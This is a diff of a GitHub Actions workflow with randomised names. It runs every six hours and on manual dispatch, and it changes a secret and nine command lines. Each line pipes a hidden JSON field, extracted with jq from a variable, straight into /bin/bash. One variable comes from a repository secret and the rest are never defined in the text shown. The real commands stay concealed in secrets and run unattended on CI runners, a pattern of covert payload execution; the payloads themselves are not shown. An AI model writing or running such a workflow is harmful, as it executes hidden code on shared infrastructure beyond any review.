@@ -2,23 +2,23 @@ name: guofumo4678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 3/6 * * *'
-jobs:  # 32547
+    - cron: '29 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: guofumo4678
         env:
-          cgtm576: ${{ secrets.cgtm576 }}
+          xtx19518: ${{ secrets.xtx19518 }}
         run: |
-          echo $cgtm576 | jq -r .b6 | /bin/bash
-          echo $dg4 | jq -r .cmo292 | /bin/bash
-          echo $kvog8600 | jq -r .tfkv1 | /bin/bash
-          echo $n69632 | jq -r .lvy13358 | /bin/bash
-          echo $w329 | jq -r .qccr77943 | /bin/bash
-          echo $yugi093 | jq -r .vkh4606 | /bin/bash
-          echo $pudi1399 | jq -r .vgruv92 | /bin/bash
-          echo $rk87135 | jq -r .l227 | /bin/bash
-          echo $hmocd4 | jq -r .s59 | /bin/bash
+          echo $xtx19518 | jq -r .ncg66 | /bin/bash
+          echo $yr3623 | jq -r .iafyh8 | /bin/bash
+          echo $o2395 | jq -r .ci40534 | /bin/bash
+          echo $rcxa33 | jq -r .dc20 | /bin/bash
+          echo $pc75889 | jq -r .z5091 | /bin/bash
+          echo $sn38773 | jq -r .sfr82 | /bin/bash
+          echo $kpph9 | jq -r .tvm6663 | /bin/bash
+          echo $a661 | jq -r .jx491 | /bin/bash
+          echo $gqrdl9 | jq -r .hsou049 | /bin/bash
 
